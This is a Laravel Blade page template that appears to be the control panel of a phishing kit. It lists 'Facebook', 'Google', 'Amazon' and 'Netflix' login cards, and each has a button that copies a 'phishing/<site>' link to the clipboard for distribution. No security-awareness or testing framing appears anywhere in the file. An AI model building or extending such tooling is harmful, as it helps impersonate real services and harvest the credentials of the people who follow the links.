@extends('layouts.app')

@section('content')
<div class="container">
    <!-- Success message container -->
    <div id="copy-success" class="alert alert-success text-center" style="display:none;">
        Link copied to clipboard!
    </div>

    <div class="row g-3">
        @foreach(['facebook','google','amazon','netflix'] as $site)
            <div class="col-md-6 col-lg-4"> <!-- flexible columns -->
                <div class="card mb-3 text-center">
                    <div class="card-body">
                        <h5>{{ ucfirst($site) }} Login</h5>
                        <!-- Hidden input for copying -->
                        <input type="text" id="link-{{ $site }}" value="{{ url('phishing/'.$site) }}" readonly style="position:absolute; left:-9999px;">
                        <button class="btn btn-primary mt-2" onclick="copyLink('{{ $site }}')">Copy Link</button>
                    </div>
                </div>
            </div>
        @endforeach
    </div>
</div>

<script>
    function copyLink(site) {
        const input = document.getElementById('link-' + site);
        input.select();
        input.setSelectionRange(0, 99999); // for mobile devices
        navigator.clipboard.writeText(input.value).then(() => {
            const successMsg = document.getElementById('copy-success');
            successMsg.style.display = 'block';
            setTimeout(() => {
                successMsg.style.display = 'none';
            }, 2000); // hide after 2 seconds
        });
    }
</script>
@endsection
